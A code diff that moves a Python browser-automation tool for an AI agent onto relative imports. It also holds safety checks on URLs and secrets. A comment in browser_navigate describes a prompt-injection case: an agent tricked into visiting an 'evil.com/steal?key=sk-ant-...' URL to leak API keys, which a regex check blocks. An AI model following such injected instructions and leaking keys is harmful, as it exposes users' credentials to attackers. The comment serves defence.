@@ -37,7 +37,7 @@ Environment Variables:
   beyond project default. Common values: 600000 (10min), 1800000 (30min) (default: none)
 
 Usage:
-    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click
+    from .browser_tool import browser_navigate, browser_snapshot, browser_click
     
     # Navigate to a page
     result = browser_navigate("https://example.com", task_id="task_123")
@@ -65,32 +65,35 @@ import time
 import requests
 from typing import Dict, Any, Optional, List
 from pathlib import Path
-from agent.auxiliary_client import call_llm
-from agent.tool_execution import ToolExecutionResult
-from VoidCube_app.contracts.artifacts import Artifact
-from VoidCube_cli.i18n import t
-from VoidCube_app.infrastructure.config.runtime_paths import get_cache_dir, get_VoidCube_home
+from ....infrastructure.providers.auxiliary_client import call_llm
+try:
+    from voidcube.runtime.agent.tool_execution import ToolExecutionResult
+except ModuleNotFoundError:
+    from src.voidcube.runtime.agent.tool_execution import ToolExecutionResult
+from ....domain.contracts.artifacts import Artifact
+from ....interfaces.cli.i18n import t
+from ....infrastructure.config.runtime_paths import get_cache_dir, get_VoidCube_home
 
 try:
-    from tools.website_policy import check_website_access
+    from ..web.website_policy import check_website_access
 except Exception:
     check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
 
 try:
-    from tools.url_safety import is_safe_url as _is_safe_url
+    from ..web.url_safety import is_safe_url as _is_safe_url
 except Exception:
     _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
-from tools.browser_providers.base import CloudBrowserProvider
-from tools.browser_providers.browserbase import BrowserbaseProvider
-from tools.browser_providers.browser_use import BrowserUseProvider
-from tools.browser_providers.firecrawl import FirecrawlProvider
-from tools.tool_backend_helpers import normalize_browser_cloud_provider
+from .providers.base import CloudBrowserProvider
+from .providers.browserbase import BrowserbaseProvider
+from .providers.browser_use import BrowserUseProvider
+from .providers.firecrawl import FirecrawlProvider
+from ..backend_helpers import normalize_browser_cloud_provider
 
 # Camofox local anti-detection browser backend (optional).
 # When CAMOFOX_URL is set, all browser operations route through the
 # camofox REST API instead of the agent-browser CLI.
 try:
-    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
+    from .browser_camofox import is_camofox_mode as _is_camofox_mode
 except ImportError:
     _is_camofox_mode = lambda: False  # noqa: E731
 
@@ -160,7 +163,7 @@ def _get_command_timeout() -> int:
     _command_timeout_resolved = True
     result = DEFAULT_COMMAND_TIMEOUT
     try:
-        from VoidCube_app.config import read_raw_config
+        from ....infrastructure.config.configuration import read_raw_config
         cfg = read_raw_config()
         val = cfg.get("browser", {}).get("command_timeout")
         if val is not None:
@@ -262,7 +265,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
 
     _cloud_provider_resolved = True
     try:
-        from VoidCube_app.config import read_raw_config
+        from ....infrastructure.config.configuration import read_raw_config
         cfg = read_raw_config()
         browser_cfg = cfg.get("browser", {})
         provider_key = None
@@ -292,7 +295,7 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
     return _cached_cloud_provider
 
 
-from VoidCube_app.infrastructure.runtime.environment import is_termux as _is_termux_environment
+from ....infrastructure.runtime.environment import is_termux as _is_termux_environment
 
 
 def _browser_install_hint() -> str:
@@ -490,7 +493,7 @@ def _allow_private_urls() -> bool:
     _allow_private_urls_resolved = True
     _cached_allow_private_urls = False  # safe default
     try:
-        from VoidCube_app.config import read_raw_config
+        from ....infrastructure.config.configuration import read_raw_config
         cfg = read_raw_config()
         _cached_allow_private_urls = bool(cfg.get("browser", {}).get("allow_private_urls"))
     except Exception as e:
@@ -1153,7 +1156,7 @@ def _run_browser_command(
                 "_install_hint": install_hint,
             }
 
-    from tools.interrupt import is_interrupted
+    from ....infrastructure.execution.interrupt import is_interrupted
     if is_interrupted():
         return {"success": False, "error": "Interrupted"}
 
@@ -1367,7 +1370,7 @@ def _extract_relevant_content(
     # Without this, a page displaying env vars or API keys would leak
     # secrets to the extraction model before run_agent.py's general
     # redaction layer ever sees the tool result.
-    from VoidCube_app.infrastructure.persistence.redaction import redact_sensitive_text
+    from ....infrastructure.persistence.redaction import redact_sensitive_text
     extraction_prompt = redact_sensitive_text(extraction_prompt)
 
     try:
@@ -1480,7 +1483,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
-    from VoidCube_app.infrastructure.persistence.redaction import _PREFIX_RE
+    from ....infrastructure.persistence.redaction import _PREFIX_RE
     url_decoded = urllib.parse.unquote(url)
     if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
@@ -1511,7 +1514,7 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_navigate
+        from .browser_camofox import camofox_navigate
         return camofox_navigate(url, task_id)
 
     effective_task_id = task_id or "default"
@@ -1623,7 +1626,7 @@ def browser_snapshot(
         JSON string with page snapshot
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_snapshot
+        from .browser_camofox import camofox_snapshot
         return camofox_snapshot(full, task_id, user_task)
 
     effective_task_id = task_id or "default"
@@ -1676,7 +1679,7 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
         JSON string with click result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_click
+        from .browser_camofox import camofox_click
         return camofox_click(ref, task_id)
 
     effective_task_id = task_id or "default"
@@ -1712,7 +1715,7 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
         JSON string with type result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_type
+        from .browser_camofox import camofox_type
         return camofox_type(ref, text, task_id)
 
     effective_task_id = task_id or "default"
@@ -1761,7 +1764,7 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     _SCROLL_PIXELS = 500
 
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_scroll
+        from .browser_camofox import camofox_scroll
         # Camofox REST API doesn't support pixel args; use repeated calls
         _SCROLL_REPEATS = 5
         result = None
@@ -1795,7 +1798,7 @@ def browser_back(task_id: Optional[str] = None) -> str:
         JSON string with navigation result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_back
+        from .browser_camofox import camofox_back
         return camofox_back(task_id)
 
     effective_task_id = task_id or "default"
@@ -1826,7 +1829,7 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
         JSON string with key press result
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_press
+        from .browser_camofox import camofox_press
         return camofox_press(key, task_id)
 
     effective_task_id = task_id or "default"
@@ -1868,7 +1871,7 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
     # --- Console output mode (original behaviour) ---
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_console
+        from .browser_camofox import camofox_console
         return camofox_console(clear, task_id)
 
     effective_task_id = task_id or "default"
@@ -1947,7 +1950,7 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    from tools.browser_camofox import _ensure_tab, _post
+    from .browser_camofox import _ensure_tab, _post
     try:
         tab_info = _ensure_tab(task_id or "default")
         tab_id = tab_info.get("tab_id") or tab_info.get("id")
@@ -1985,7 +1988,7 @@ def _maybe_start_recording(task_id: str):
         if task_id in _recording_sessions:
             return
     try:
-        from VoidCube_app.config import read_raw_config
+        from ....infrastructure.config.configuration import read_raw_config
         VoidCube_home = get_VoidCube_home()
         cfg = read_raw_config()
         record_enabled = cfg.get("browser", {}).get("record_sessions", False)
@@ -2040,7 +2043,7 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
         JSON string with list of images (src and alt)
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_get_images
+        from .browser_camofox import camofox_get_images
         return camofox_get_images(task_id)
 
     effective_task_id = task_id or "default"
@@ -2113,7 +2116,7 @@ def browser_vision(
         JSON string with vision analysis results and screenshot_path
     """
     if _is_camofox_mode():
-        from tools.browser_camofox import camofox_vision
+        from .browser_camofox import camofox_vision
         return camofox_vision(question, annotate, task_id)
 
     import base64
@@ -2194,7 +2197,7 @@ def browser_vision(
         # screenshot analysis, so the default must be generous.
         vision_timeout = 120.0
         try:
-            from VoidCube_app.config import load_config
+            from ....infrastructure.config.configuration import load_config
             _cfg = load_config()
             _vt = _cfg.get("auxiliary", {}).get("vision", {}).get("timeout")
             if _vt is not None:
@@ -2223,7 +2226,7 @@ def browser_vision(
         try:
             response = call_llm(**call_kwargs)
         except Exception as _api_err:
-            from tools.vision_tools import (
+            from ..media.vision_tools import (
                 _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
             )
             if (_is_image_size_error(_api_err)
@@ -2243,7 +2246,7 @@ def browser_vision(
         
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
-        from VoidCube_app.infrastructure.persistence.redaction import redact_sensitive_text
+        from ....infrastructure.persistence.redaction import redact_sensitive_text
         analysis = redact_sensitive_text(analysis)
         response_data = {
             "success": True,
@@ -2364,7 +2367,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
     # The inactivity reaper still frees idle resources.
     if _is_camofox_mode():
         try:
-            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
+            from .browser_camofox import camofox_close, camofox_soft_cleanup
             if not camofox_soft_cleanup(task_id):
                 camofox_close(task_id)
         except Exception as e:
@@ -2544,7 +2547,7 @@ if __name__ == "__main__":
 # ---------------------------------------------------------------------------
 # Registry
 # ---------------------------------------------------------------------------
-from tools.registry import registry, tool_error
+from ..registry import registry, tool_error
 
 _BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}
 
